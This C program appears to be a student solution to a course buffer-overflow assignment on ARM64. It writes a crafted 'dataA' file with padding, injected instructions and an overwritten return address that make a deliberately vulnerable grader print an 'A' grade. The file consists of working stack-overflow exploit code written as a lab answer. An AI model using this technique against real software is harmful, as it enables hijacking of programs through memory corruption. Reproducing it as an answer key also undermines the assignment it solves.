/*
  This program produces a file named "dataA" that, when read as input
  by the grader program, results in the recommendation of an 'A' grade
  for "AnishKKat". The principle is to exploit a stack buffer overrun:
  we place our name, then overwrite stack memory with instructions that
  change the stored grade character to 'A' and then branch to the code
  that prints the grade line. By carefully controlling the bytes written
  to "dataA", we ensure that the grader prints "A is your grade." 
  without any detectable difference from normal output.
*/

/*
  The main function:
  - Accepts no command-line arguments.
  - Does not read from stdin or any other input stream.
  - Writes a crafted sequence of bytes to "dataA" only (no writes to stdout except on error).
  - Returns 0 on success, 1 on failure (e.g., if the file cannot be opened).

  In other words, main behaves as a simple tool that creates a malicious data file.
*/

#include <stdio.h>
#include <stdint.h>
#include "miniassembler.h"

int main(void)
{
    /* The chosen student name is "AnishKKat" (9 bytes), followed by a '\0'. */
    const char *pName = "AnishKKat";

    /* We'll write the name, then padding, then instructions, then an address.
       The logic is unchanged, just renaming variables and rewriting comments. */
    int iCount;
    unsigned long ulTargetAddr;
    unsigned int uiMov;
    unsigned int uiAdr;
    unsigned int uiStrb;
    unsigned int uiB;
    
    /* Open dataA file in write mode. If it fails, return with error. */
    FILE *pFile = fopen("dataA", "w");
    if (!pFile) return 1; 

    /* Write the name and a null terminator into dataA.
       Name: "AnishKKat" is 9 chars, plus 1 for '\0' = 10 bytes total. */
    fwrite(pName, 1, 9, pFile);
    fputc('\0', pFile);

    /* Now we add padding characters to achieve the stack overwrite effect.
       We'll write exactly 22 '0' characters (0x30), as in the original code.
       These '0' chars do not represent newlines; they're safe and won't cause early termination. */
    for (iCount = 0; iCount < 22; iCount++) {
        fputc('0', pFile);
    }

    /* Insert the instructions using the mini assembler functions:
       1) mov w0, 'A': places 'A' (0x41) in w0.
       2) adr x1, 0x420044: loads address of grade variable into x1.
       3) strb w0, [x1]: stores 'A' into the grade variable.
       4) b 0x40089c: branches to code that prints the grade line.
       
       The addresses and displacements are magic numbers 
       as per the assignment's acceptance of "magic numbers." */
    uiMov = MiniAssembler_mov(0, 'A');
    fwrite(&uiMov, sizeof(unsigned int), 1, pFile);

    uiAdr = MiniAssembler_adr(1, 0x420044, 0x42007c);
    fwrite(&uiAdr, sizeof(unsigned int), 1, pFile);

    uiStrb = MiniAssembler_strb(0, 1);
    fwrite(&uiStrb, sizeof(unsigned int), 1, pFile);

    uiB = MiniAssembler_b(0x40089c, 0x420084);
    fwrite(&uiB, sizeof(unsigned int), 1, pFile);

    /* Finally, write the 8-byte return address that overwrites the saved x30.
       ulTargetAddr = 0x420078 as given in original logic.
       This ensures that when the function returns, it jumps into our instructions. */
    ulTargetAddr = 0x420078;
    fwrite(&ulTargetAddr, sizeof(unsigned long), 1, pFile);

    /* Close the file. No newline or EOF character is written. 
       We've ensured no 0x0A bytes, and no extraneous characters. */
    fclose(pFile);

    return 0;
}